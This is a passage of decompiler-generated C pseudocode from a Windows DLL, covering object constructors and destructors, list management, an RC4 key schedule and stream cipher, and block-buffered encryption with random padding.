    }
    if ( v12 )
    {
      v6 = a2[1];
      *(_BYTE *)(v6 + 8) = 1;
    }
  }
  else
  {
    while ( 1 )
    {
      v5 = a2;
      LOBYTE(v6) = sub_10052027(a2, 8, a4);
      v4 -= 8;
      if ( !v4 )
        break;
      if ( v4 <= 8 )
        goto LABEL_6;
    }
  }
  return v6;
}
// 10052066: variable 'this' is possibly undefined

//----- (100520F0) --------------------------------------------------------
char __stdcall sub_100520F0(char a1, char a2, unsigned __int8 a3)
{
  _DWORD *v3; // eax

  if ( a3 > 8u )
  {
    v3 = sub_1000E7F7(&a3, 1, 0);
    sub_10007882((int)v3);
  }
  if ( a3 )
    return a1 & (-1 << (8 - a3)) | a2 & (255 >> a3);
  else
    return a2;
}

//----- (10052153) --------------------------------------------------------
_DWORD *__thiscall sub_10052153(_DWORD *this, int a2)
{
  sub_1000E7B3(this, a2);
  *this = &off_10102420;
  return this;
}
// 10102420: using guessed type int (__thiscall *off_10102420)(void *Block, char);

//----- (1005218B) --------------------------------------------------------
_DWORD *__stdcall sub_1005218B(_DWORD *a1, int a2, int a3)
{
  *a1 = &off_101044F4;
  sub_1000D372(a1 + 1, a2);
  a1[3] = a3;
  return a1;
}
// 101044F4: using guessed type int (__thiscall *off_101044F4)(void *Block, char);

//----- (100521CA) --------------------------------------------------------
int *__thiscall sub_100521CA(int *Block, char a2)
{
  sub_100521E9(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100521E9) --------------------------------------------------------
void __thiscall sub_100521E9(int *this)
{
  *this = (int)&off_101044F4;
  sub_1000D3AD(this + 1);
}
// 101044F4: using guessed type int (__thiscall *off_101044F4)(void *Block, char);

//----- (10052215) --------------------------------------------------------
char __thiscall sub_10052215(_DWORD **this)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  bool v4; // bl
  int v5; // ecx
  char v6; // bl
  void *v8[2]; // [esp+10h] [ebp-30h] BYREF
  int v9[2]; // [esp+18h] [ebp-28h] BYREF
  _DWORD v10[5]; // [esp+20h] [ebp-20h] BYREF
  int v11; // [esp+3Ch] [ebp-4h]

  (*(void (__thiscall **)(_DWORD *, void **))(*this[3] + 8))(this[3], v8);
  v11 = 0;
  if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v8[0] + 4))(v8[0]) )
  {
LABEL_4:
    v6 = 0;
  }
  else
  {
    while ( 1 )
    {
      v2 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v8[0] + 12))(v8[0]);
      sub_1001BF9A(v10, v2);
      LOBYTE(v11) = 1;
      v3 = sub_10020EF4((int)v10, v9);
      LOBYTE(v11) = 2;
      v4 = sub_1000DE70((int)v3, (int)(this + 1));
      LOBYTE(v11) = 1;
      sub_1000D3AD(v9);
      if ( v4 )
        break;
      sub_10021F56(v5, (int)v8[0]);
      LOBYTE(v11) = 0;
      sub_1001BDAA((int)v10);
      if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v8[0] + 4))(v8[0]) )
        goto LABEL_4;
    }
    LOBYTE(v11) = 0;
    sub_1001BDAA((int)v10);
    v6 = 1;
  }
  v11 = -1;
  sub_1002228F(v8);
  return v6;
}
// 100522A6: variable 'v5' is possibly undefined
// 10052215: using guessed type _DWORD var_20[5];

//----- (100522FD) --------------------------------------------------------
_DWORD *__stdcall sub_100522FD(_DWORD *a1, int a2)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_100FBF5C;
  *a1 = &off_10104548;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  *a1 = &off_10104500;
  a1[4] = &off_10104540;
  a1[5] = a2;
  return result;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10104500: using guessed type int (__thiscall *off_10104500)(void *Block, char);
// 10104540: using guessed type int (__stdcall *off_10104540)(int);
// 10104548: using guessed type int (__thiscall *off_10104548)(void *Block, char);

//----- (10052354) --------------------------------------------------------
_DWORD *__thiscall sub_10052354(_DWORD *Block, char a2)
{
  sub_10052373(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10052373) --------------------------------------------------------
void *__thiscall sub_10052373(_DWORD *this)
{
  *this = &off_10104500;
  this[4] = &off_10104540;
  return sub_1005252E(this);
}
// 10104500: using guessed type int (__thiscall *off_10104500)(void *Block, char);
// 10104540: using guessed type int (__stdcall *off_10104540)(int);

//----- (100523A3) --------------------------------------------------------
int __stdcall sub_100523A3(int *a1)
{
  int v1; // esi
  int v3[5]; // [esp+8h] [ebp-20h] BYREF
  int v4; // [esp+24h] [ebp-4h]

  sub_10007972(v3);
  v4 = 0;
  sub_10052437(a1, (int)v3);
  if ( (*(int (__thiscall **)(int *))(v3[0] + 4))(v3) )
    v1 = *(_DWORD *)(*(int (__thiscall **)(int *, _DWORD))(v3[0] + 44))(v3, 0);
  else
    v1 = -1;
  v4 = -1;
  sub_100079EC((int)v3);
  return v1;
}

//----- (10052423) --------------------------------------------------------
bool __thiscall sub_10052423(int *this)
{
  return sub_100523A3(this - 4) != -1;
}

//----- (10052437) --------------------------------------------------------
void __thiscall sub_10052437(int *this, int a2)
{
  int v3; // eax
  void *v4; // esi
  int v5; // ecx
  int v6; // [esp+0h] [ebp-3Ch] BYREF
  void *v7; // [esp+10h] [ebp-2Ch] BYREF
  volatile LONG *v8; // [esp+14h] [ebp-28h]
  void *v9[2]; // [esp+18h] [ebp-24h] BYREF
  int v10; // [esp+20h] [ebp-1Ch] BYREF
  char v11; // [esp+24h] [ebp-18h]
  char v12; // [esp+2Bh] [ebp-11h]
  int *v13; // [esp+2Ch] [ebp-10h]
  int v14; // [esp+38h] [ebp-4h]

  v13 = &v6;
  v11 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  sub_10024E48(this[5]);
  v10 = 0;
  (*(void (__thiscall **)(int *, void **))(*this + 12))(this, v9);
  v14 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v9[0] + 4))(v9[0]) )
  {
    v3 = (*(int (__thiscall **)(void *))(*(_DWORD *)v9[0] + 12))(v9[0]);
    v8 = *(volatile LONG **)(v3 + 4);
    v7 = *(void **)v3;
    v4 = v7;
    InterlockedIncrement(v8);
    v12 = 0;
    LOBYTE(v14) = 2;
    if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v4 + 4))(v4) == 1 )
      v12 = 1;
    v14 = 1;
    if ( v12 )
    {
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)a2 + 36))(a2, &v10);
      if ( !v11 )
      {
        LOBYTE(v14) = 0;
        sub_1003406C(&v7);
        break;
      }
    }
    sub_10021F56(v5, (int)v9[0]);
    ++v10;
    LOBYTE(v14) = 0;
    sub_1003406C(&v7);
  }
  v14 = -1;
  sub_1002228F(v9);
}
// 10052515: variable 'v5' is possibly undefined

//----- (1005252E) --------------------------------------------------------
void *__thiscall sub_1005252E(_DWORD *this)
{
  int i; // eax
  int v3; // edi
  _DWORD v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v5[4] = v5;
  v5[3] = this;
  *this = &off_10104548;
  v6 = 1;
  for ( i = this[1]; i; i = v3 )
  {
    v3 = *(_DWORD *)(i + 8);
    sub_100526BD((void **)i);
  }
  v6 = -1;
  return sub_100185A9(this);
}
// 10104548: using guessed type int (__thiscall *off_10104548)(void *Block, char);

//----- (10052594) --------------------------------------------------------
_DWORD *__thiscall sub_10052594(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10104588;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10104588: using guessed type int (__thiscall *off_10104588)(void *Block, char);

//----- (100525FA) --------------------------------------------------------
_DWORD *__thiscall sub_100525FA(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_10104588;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10104588: using guessed type int (__thiscall *off_10104588)(void *Block, char);

//----- (10052660) --------------------------------------------------------
void __thiscall sub_10052660(void *this, int a2)
{
  void *v2[2]; // [esp+0h] [ebp-14h] BYREF
  int v3; // [esp+10h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(void *, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_1002228F(v2);
}

//----- (1005269E) --------------------------------------------------------
_DWORD *__thiscall sub_1005269E(_DWORD *Block, char a2)
{
  sub_1005252E(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100526BD) --------------------------------------------------------
void **__stdcall sub_100526BD(void **Block)
{
  sub_1003406C(Block);
  j__free(Block);
  return Block;
}

//----- (100526ED) --------------------------------------------------------
void **__thiscall sub_100526ED(int this)
{
  int v2; // eax
  _DWORD *v3; // eax
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  void **result; // eax
  _DWORD v9[4]; // [esp+8h] [ebp-10h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    v3 = sub_1000E8EF(v9);
    v9[3] = 0;
    sub_100078FE((int)v3);
  }
  v4 = *(_DWORD *)(v2 + 8);
  v5 = *(_DWORD *)(this + 8);
  if ( v5 )
    *(_DWORD *)(v5 + 8) = v4;
  if ( v4 )
    *(_DWORD *)(v4 + 12) = *(_DWORD *)(this + 8);
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 4) = v4;
  v7 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v7 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v7 + 8) = *(_DWORD *)(this + 8);
  result = *(void ***)(this + 12);
  if ( result )
    result = sub_100526BD(*(void ***)(this + 12));
  *(_DWORD *)(this + 12) = v4;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10052775) --------------------------------------------------------
int *__thiscall sub_10052775(_DWORD *this, int *a2)
{
  void *v3; // eax
  volatile LONG *v4; // ecx
  int v5; // ecx
  int *result; // eax
  int v7; // ecx
  int v8; // ecx
  volatile LONG *v9; // [esp-10h] [ebp-28h] BYREF
  volatile LONG *v10; // [esp-Ch] [ebp-24h]
  int v11; // [esp-8h] [ebp-20h]
  volatile LONG *v12; // [esp-4h] [ebp-1Ch]
  int *v13; // [esp+4h] [ebp-14h]
  void *Block; // [esp+8h] [ebp-10h]
  int v15; // [esp+14h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  v3 = operator new(0x10u);
  v4 = v12;
  Block = v3;
  v15 = 0;
  if ( v3 )
  {
    v12 = (volatile LONG *)this[2];
    v11 = this[3];
    v10 = v4;
    v9 = v4;
    v10 = (volatile LONG *)a2[1];
    v5 = *a2;
    v13 = (int *)&v9;
    v9 = (volatile LONG *)v5;
    InterlockedIncrement(v10);
    LOBYTE(v15) = 0;
    result = sub_1005282C((int *)Block, (int)v9, v10, v11, (int)v12);
  }
  else
  {
    result = 0;
  }
  v15 = -1;
  v7 = this[2];
  if ( v7 )
    *(_DWORD *)(v7 + 8) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v8 = this[3];
  this[2] = result;
  if ( v8 )
    *(_DWORD *)(v8 + 12) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (1005280C) --------------------------------------------------------
_DWORD *__thiscall sub_1005280C(_DWORD *Block, char a2)
{
  *Block = &off_10104588;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10104588: using guessed type int (__thiscall *off_10104588)(void *Block, char);

//----- (1005282C) --------------------------------------------------------
int *__stdcall sub_1005282C(int *a1, int a2, volatile LONG *lpAddend, int a4, int a5)
{
  int v5; // ecx
  volatile LONG *v7; // [esp-4h] [ebp-14h]

  v5 = a2;
  v7 = lpAddend;
  a1[1] = (int)lpAddend;
  *a1 = v5;
  InterlockedIncrement(v7);
  a1[2] = a4;
  a1[3] = a5;
  sub_1003406C((void **)&a2);
  return a1;
}

//----- (1005287D) --------------------------------------------------------
_DWORD *__thiscall sub_1005287D(_DWORD *this, char a2)
{
  return sub_10052354(this - 4, a2);
}

//----- (1005288C) --------------------------------------------------------
_DWORD *__thiscall sub_1005288C(_DWORD *Block, char a2)
{
  *Block = &off_101045A8;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 101045A8: using guessed type int (__thiscall *off_101045A8)(void *Block, char);

//----- (100528AC) --------------------------------------------------------
_DWORD *__stdcall sub_100528AC(_DWORD *a1)
{
  _DWORD *v1; // eax
  int v3[5]; // [esp+8h] [ebp-24h] BYREF
  char v4[4]; // [esp+1Ch] [ebp-10h] BYREF
  int v5; // [esp+28h] [ebp-4h]

  *a1 = &off_101045A8;
  v5 = 0;
  *a1 = &off_101045C4;
  sub_1000B1F3((void *)0x80, (int)(a1 + 66), &unk_100FF490);
  LOBYTE(v5) = 1;
  v4[0] = 0;
  v4[1] = 0;
  v4[2] = 0;
  v4[3] = 0;
  v1 = (_DWORD *)sub_1000B1F3((void *)4, (int)v3, v4);
  LOBYTE(v5) = 2;
  sub_10052954((int)a1, v1);
  LOBYTE(v5) = 1;
  sub_1000B3DF(v3);
  return a1;
}
// 101045A8: using guessed type int (__thiscall *off_101045A8)(void *Block, char);
// 101045C4: using guessed type int (__thiscall *off_101045C4)(void *Block, char);
// 100528AC: using guessed type int var_24[5];

//----- (10052934) --------------------------------------------------------
_DWORD *__thiscall sub_10052934(_DWORD *Block, char a2)
{
  sub_1004F436(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10052954) --------------------------------------------------------
void __thiscall sub_10052954(int this, _DWORD *a2)
{
  int v3; // edx
  int i; // eax
  int v5; // ecx
  char v6; // bl
  char *v7; // edx
  char v8; // al
  char *v9; // edi
  int v10[5]; // [esp+Ch] [ebp-28h] BYREF
  int v11; // [esp+20h] [ebp-14h]
  int v12; // [esp+24h] [ebp-10h]
  int v13; // [esp+30h] [ebp-4h]
  unsigned __int8 v14; // [esp+3Fh] [ebp+Bh]

  sub_1000B63D((_DWORD *)(this + 264), (int)v10, a2);
  v13 = 0;
  v11 = sub_1000B4B8(v10);
  for ( i = 0; i < 256; ++i )
    *(_BYTE *)(i + this + 4) = i;
  *(_BYTE *)(this + 260) = v3;
  *(_BYTE *)(this + 261) = v3;
  v14 = v3;
  v12 = v3;
  do
  {
    v5 = (unsigned __int8)v3;
    v6 = *(_BYTE *)((unsigned __int8)v3 + v11);
    v7 = (char *)(v12 + this + 4);
    v8 = *v7;
    v14 += *v7 + v6;
    v9 = (char *)(v14 + this + 4);
    *v7 = *v9;
    byte_101863F4 = v8;
    *v9 = v8;
    v3 = (v5 + 1) % v10[3];
    ++v12;
  }
  while ( v12 < 256 );
  v13 = -1;
  sub_1000B3DF(v10);
}
// 10052998: variable 'v3' is possibly undefined
// 101863F4: using guessed type char byte_101863F4;

//----- (10052A04) --------------------------------------------------------
unsigned int __thiscall sub_10052A04(_BYTE *this, _DWORD *a2, _DWORD *a3)
{
  int v5; // ecx
  void *v6; // eax
  unsigned int v7; // edi
  int v8; // ecx
  unsigned int result; // eax
  char v10; // dl
  char *v11; // edi
  char v12; // cl
  const void *v13; // [esp-8h] [ebp-18h]
  size_t v14; // [esp-4h] [ebp-14h]
  unsigned int v15; // [esp+Ch] [ebp-4h]
  int v16; // [esp+18h] [ebp+8h]
  char v17; // [esp+1Fh] [ebp+Fh]

  (*(void (__thiscall **)(_BYTE *, _DWORD, _DWORD))(*(_DWORD *)this + 20))(this, a2[3], a3[3]);
  v14 = a2[3];
  v17 = *(_BYTE *)(a3[1] + 8);
  v13 = (const void *)sub_1000B4B8(a2);
  v6 = (void *)sub_1000B49B(a3, v5);
  memcpy(v6, v13, v14);
  v7 = a3[3];
  v15 = v7;
  v16 = sub_1000B49B(a3, v8);
  for ( result = 0; result < v15; ++result )
  {
    v10 = this[(unsigned __int8)++this[260] + 4];
    this[261] += v10;
    v11 = &this[(unsigned __int8)this[261] + 4];
    v12 = *v11;
    *v11 = v10;
    this[(unsigned __int8)this[260] + 4] = v12;
    *(_BYTE *)(result + v16) ^= this[(unsigned __int8)(v10 + v12) + 4];
  }
  if ( v17 )
  {
    result = a3[1];
    *(_BYTE *)(result + 8) = 1;
  }
  return result;
}
// 10052A34: variable 'v5' is possibly undefined
// 10052A4A: variable 'v8' is possibly undefined

//----- (10052AB3) --------------------------------------------------------
int sub_10052AB3()
{
  return 4;
}

//----- (10052AB7) --------------------------------------------------------
int __thiscall sub_10052AB7(void *this, int a2, int a3)
{
  void *v3; // edx
  int v4; // ecx
  unsigned int v5; // ebx
  void *v6; // ebx
  LONG *v7; // eax
  LONG *v8; // eax
  int v10[5]; // [esp+Ch] [ebp-2Ch] BYREF
  int v11; // [esp+20h] [ebp-18h]
  int v12; // [esp+24h] [ebp-14h]
  unsigned int v13; // [esp+28h] [ebp-10h]
  void *v14; // [esp+34h] [ebp-4h]

  v13 = 4096;
  sub_1002033C(this, a2, 0);
  v14 = v3;
  *(_DWORD *)(a2 + 16) = a3;
  *(_DWORD *)a2 = &off_101045E0;
  sub_1000B1F3(0, a2 + 20, v3);
  v12 = a2 + 44;
  sub_1000B1F3(0, a2 + 44, 0);
  sub_1000B1F3((void *)1, a2 + 64, 0);
  v11 = a2 + 84;
  sub_1000B1F3(0, a2 + 84, 0);
  LOBYTE(v14) = 4;
  *(_BYTE *)(a2 + 105) = 0;
  sub_10052F8A((_DWORD *)a2);
  v4 = *(_DWORD *)(a2 + 16);
  *(_BYTE *)(a2 + 104) = 0;
  v5 = 0x1000u % (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 16))(v4);
  if ( v5 )
    v13 = 4096 - v5 + (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(a2 + 16) + 16))(*(_DWORD *)(a2 + 16));
  v6 = (void *)v13;
  *(_DWORD *)(a2 + 40) = 0;
  v7 = (LONG *)sub_1000B1F3(v6, (int)v10, 0);
  LOBYTE(v14) = 6;
  sub_1000B3BD(v7, a2 + 20);
  LOBYTE(v14) = 4;
  sub_1000B3DF(v10);
  v8 = (LONG *)sub_1000B1F3(v6, (int)v10, 0);
  LOBYTE(v14) = 7;
  sub_1000B3BD(v8, v12);
  LOBYTE(v14) = 4;
  sub_1000B3DF(v10);
  (*(void (__thiscall **)(_DWORD, int))(**(_DWORD **)(a2 + 16) + 4))(*(_DWORD *)(a2 + 16), v11);
  return a2;
}
// 10052ADB: variable 'v3' is possibly undefined
// 101045E0: using guessed type int (__thiscall *off_101045E0)(void *Block, char);
// 10052AB7: using guessed type int var_2C[5];

//----- (10052BD9) --------------------------------------------------------
void *__thiscall sub_10052BD9(void *Block, char a2)
{
  sub_10052BF8((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10052BF8) --------------------------------------------------------
int __thiscall sub_10052BF8(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_101045E0;
  v4 = 5;
  sub_100203B7((_BYTE *)this);
  v4 = 3;
  sub_1000B3DF((int *)(this + 84));
  LOBYTE(v4) = 2;
  sub_1000B3DF((int *)(this + 64));
  LOBYTE(v4) = 1;
  sub_1000B3DF((int *)(this + 44));
  LOBYTE(v4) = 0;
  sub_1000B3DF((int *)(this + 20));
  v4 = -1;
  return sub_1002036C((_BYTE *)this);
}
// 101045E0: using guessed type int (__thiscall *off_101045E0)(void *Block, char);

//----- (10052C83) --------------------------------------------------------
int __thiscall sub_10052C83(char *this, char a2)
{
  char *v3; // edi

  v3 = this + 64;
  *(_BYTE *)sub_1000B4CB((int)(this + 64), (int)this, 0) = a2;
  return (*(int (__thiscall **)(char *, char *))(*(_DWORD *)this + 12))(this, v3);
}

//----- (10052CA9) --------------------------------------------------------
void __thiscall sub_10052CA9(_BYTE *this, _DWORD *Size)
{
  int v2; // esi
  bool v3; // zf
  int v4; // eax
  unsigned int v5; // eax
  int v6; // eax
  char v7; // bl
  int v8; // ecx
  int v9; // eax
  LONG *v10; // eax
  int v11; // esi
  int v12; // ecx
  unsigned int v13; // edi
  unsigned int v14; // eax
  void (__thiscall **v15)(int, _DWORD, _DWORD, _DWORD, const void *, size_t); // eax
  char v16; // bl
  int v17; // eax
  int v18; // edx
  _DWORD *v19; // ecx
  void *v20; // eax
  _DWORD v21[3]; // [esp-14h] [ebp-74h] BYREF
  const void *v22; // [esp-8h] [ebp-68h]
  int v23; // [esp-4h] [ebp-64h]
  int v24[5]; // [esp+Ch] [ebp-54h] BYREF
  int v25[5]; // [esp+20h] [ebp-40h] BYREF
  int v26[3]; // [esp+34h] [ebp-2Ch] BYREF
  unsigned int v27; // [esp+40h] [ebp-20h]
  char v28[4]; // [esp+48h] [ebp-18h] BYREF
  _BYTE *v29; // [esp+4Ch] [ebp-14h]
  _DWORD *v30; // [esp+50h] [ebp-10h]
  int v31; // [esp+5Ch] [ebp-4h]
  int Sizea; // [esp+68h] [ebp+8h]

  v2 = (int)this;
  v3 = this[105] == 0;
  v29 = this;
  if ( !v3 )
  {
    v4 = sub_1000E88D((int)v28, 1, 0);
    v31 = 0;
    sub_10012582(v4, 63);
  }
  if ( !this[104] )
  {
    (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 52))(this);
    *(_BYTE *)(v2 + 104) = 1;
  }
  sub_1000B36F(Size, (int)v26);
  v31 = 1;
  if ( v27 )
  {
    v30 = (_DWORD *)(v2 + 20);
    while ( 1 )
    {
      v5 = *(_DWORD *)(v2 + 32) - *(_DWORD *)(v2 + 40);
      if ( v27 < v5 )
        v5 = v27;
      Sizea = v5;
      v6 = *(_DWORD *)(v2 + 24);
      v23 = Sizea;
      v7 = *(_BYTE *)(v6 + 8);
      v22 = (const void *)sub_1000B4B8(v26);
      v9 = sub_1000B49B(v30, v8);
      memcpy((void *)(*(_DWORD *)(v2 + 40) + v9), v22, v23);
      if ( v7 )
        *(_BYTE *)(*(_DWORD *)(v2 + 24) + 8) = 1;
      v10 = (LONG *)sub_1000B67C(v26, (int)v24, Sizea, v27 - Sizea);
      LOBYTE(v31) = 2;
      sub_1000B3BD(v10, (int)v26);
      LOBYTE(v31) = 1;
      sub_1000B3DF(v24);
      v11 = (int)v29;
      v12 = *((_DWORD *)v29 + 4);
      *((_DWORD *)v29 + 10) += Sizea;
      if ( *(_DWORD *)(v11 + 40) >= (unsigned int)(*(int (__thiscall **)(int))(*(_DWORD *)v12 + 16))(v12) )
      {
        v13 = *(_DWORD *)(v11 + 40);
        v14 = (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(v11 + 16) + 16))(*(_DWORD *)(v11 + 16));
        sub_1000B67C(v30, (int)v25, 0, v13 - v13 % v14);
        LOBYTE(v31) = 3;
        sub_1000B36F(v25, (int)v21);
        LOBYTE(v31) = 4;
        v15 = (void (__thiscall **)(int, _DWORD, _DWORD, _DWORD, const void *, size_t))(*(_DWORD *)v11 + 48);
        LOBYTE(v31) = 3;
        (*v15)(v11, v21[0], v21[1], v21[2], v22, v23);
        v16 = *(_BYTE *)(*(_DWORD *)(v11 + 24) + 8);
        *(_DWORD *)(v11 + 40) -= v25[3];
        v23 = *(_DWORD *)(v11 + 40);
        v17 = sub_1000B4B8(v30);
        v22 = (const void *)(v18 + v17);
        v20 = (void *)sub_1000B49B(v19, (int)v19);
        memcpy_0(v20, v22, v23);
        if ( v16 )
          *(_BYTE *)(*(_DWORD *)(v11 + 24) + 8) = 1;
        LOBYTE(v31) = 1;
        sub_1000B3DF(v25);
      }
      if ( !v27 )
        break;
      v2 = (int)v29;
    }
  }
  v31 = -1;
  sub_1000B3DF(v26);
}
// 10052D38: variable 'v8' is possibly undefined
// 10052E00: variable 'v18' is possibly undefined
// 10052E03: variable 'v19' is possibly undefined
// 10052CA9: using guessed type char var_18[4];
// 10052CA9: using guessed type int var_2C[3];
// 10052CA9: using guessed type int var_54[5];

//----- (10052E4F) --------------------------------------------------------
void __thiscall sub_10052E4F(_DWORD *this, int a2, int a3, int a4, int a5, int a6)
{
  int v7; // eax
  int v8[5]; // [esp+8h] [ebp-20h] BYREF
  int v9; // [esp+24h] [ebp-4h]

  v9 = 0;
  sub_1000B6B7(this + 11, (int)v8, 0, a5);
  LOBYTE(v9) = 1;
  (*(void (__thiscall **)(_DWORD, int *, int *))(*(_DWORD *)this[4] + 12))(this[4], &a2, v8);
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)v7 + 12))(v7, v8);
  LOBYTE(v9) = 0;
  sub_1000B3DF(v8);
  v9 = -1;
  sub_1000B3DF(&a2);
}
// 10052E4F: using guessed type int var_20[5];

//----- (10052EC3) --------------------------------------------------------
void __thiscall sub_10052EC3(_DWORD **this)
{
  void *v2; // eax
  int v3; // ecx
  void *v4; // eax
  int v5; // ecx
  int v6; // eax
  int v7; // ecx
  _DWORD *v8; // eax
  int v9; // [esp-10h] [ebp-3Ch] BYREF
  int v10; // [esp-Ch] [ebp-38h]
  int v11; // [esp-8h] [ebp-34h]
  const void *v12; // [esp-4h] [ebp-30h]
  _DWORD *v13; // [esp+0h] [ebp-2Ch]
  int v14[6]; // [esp+8h] [ebp-24h] BYREF
  int v15; // [esp+28h] [ebp-4h]

  if ( this[10] )
  {
    v2 = (void *)(*(int (__thiscall **)(_DWORD *, _DWORD))(*this[4] + 16))(this[4], 0);
    sub_1000B1F3(v2, (int)v14, v13);
    v15 = 0;
    v13 = this[10];
    v12 = (const void *)sub_1000B4B8(this + 5);
    v4 = (void *)sub_1000B49B(v14, v3);
    memcpy(v4, v12, (size_t)v13);
    v13 = (_DWORD *)(v14[3] - (_DWORD)this[10]);
    v6 = sub_1000B49B(v14, v5);
    memset((char *)this[10] + v6, 0, (size_t)v13);
    v10 = v7;
    v9 = v7;
    *(_BYTE *)(v14[1] + 8) = 1;
    v14[5] = (int)&v9;
    sub_1000B36F(v14, (int)&v9);
    LOBYTE(v15) = 1;
    v8 = *this;
    LOBYTE(v15) = 0;
    ((void (__thiscall *)(_DWORD **, int, int, int, const void *))v8[12])(this, v9, v10, v11, v12);
    v15 = -1;
    sub_1000B3DF(v14);
  }
  this[10] = 0;
  *((_BYTE *)this + 105) = 1;
}
// 10052F06: variable 'v3' is possibly undefined
// 10052F20: variable 'v5' is possibly undefined
// 10052F31: variable 'v7' is possibly undefined

//----- (10052F75) --------------------------------------------------------
int __thiscall sub_10052F75(void *this)
{
  int v2; // eax

  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int, int))(*(_DWORD *)v2 + 12))(v2, (int)this + 84);
}

//----- (10052F8A) --------------------------------------------------------
void __thiscall sub_10052F8A(_DWORD *this)
{
  int *v2; // ecx
  int v3; // eax
  void *v4; // eax
  LONG *v5; // eax
  int v6; // edi
  unsigned int i; // esi
  char v8; // bl
  int v9; // ecx
  _BYTE *v10; // eax
  int v11[5]; // [esp+Ch] [ebp-28h] BYREF
  _DWORD *v12; // [esp+20h] [ebp-14h]
  _DWORD *v13; // [esp+24h] [ebp-10h]
  int v14; // [esp+30h] [ebp-4h]

  v2 = (int *)this[4];
  v3 = *v2;
  v13 = this;
  v4 = (void *)(*(int (__thiscall **)(int *))(v3 + 24))(v2);
  v5 = (LONG *)sub_1000B1F3(v4, (int)v11, 0);
  v14 = 0;
  v12 = this + 21;
  sub_1000B3BD(v5, (int)(this + 21));
  v14 = -1;
  sub_1000B3DF(v11);
  v6 = (int)v13;
  for ( i = 0; i < *(_DWORD *)(v6 + 96); *v10 = v8 )
  {
    v8 = rand();
    v10 = (_BYTE *)sub_1000B4CB((int)v12, v9, i++);
  }
}
// 10052FF6: variable 'v9' is possibly undefined
// 10052F8A: using guessed type int var_28[5];

//----- (10053012) --------------------------------------------------------
int __usercall sub_10053012@<eax>(unsigned int a1@<ebx>)
{
  int v1; // esi
  int v2; // esi
  int v3; // edi
  int v4; // eax

  if ( !a1 )
    return 0;
  v2 = *(_DWORD *)a1;
  v3 = *(_DWORD *)(*(_DWORD *)a1 + 68);
  sub_10061305(v3);
  v4 = sub_1005BD60(a1);
  v1 = sub_1005922F(v2, v4);
  sub_10061317(v3);
  return v1;
}

//----- (10053046) --------------------------------------------------------
int __usercall sub_10053046@<eax>(int a1@<edi>)
{
  int v1; // ebx
  int v2; // eax
  int v3; // esi

  v1 = 0;
  if ( a1 )
  {
    sub_10061305(*(_DWORD *)(*(_DWORD *)a1 + 68));
    v2 = sub_1005BCA1(a1);
    v3 = *(_DWORD *)a1;
    *(_DWORD *)(a1 + 84) = -1;
    *(_DWORD *)(a1 + 88) = 0;
    *(_BYTE *)(a1 + 56) = 2;
    *(_DWORD *)(a1 + 68) = -1108210269;
    *(_DWORD *)(a1 + 104) = 0;
    *(_DWORD *)(a1 + 80) = 1;
    *(_BYTE *)(a1 + 99) = -1;
    *(_DWORD *)(a1 + 200) = 0;
    v1 = sub_1005922F(v3, v2);
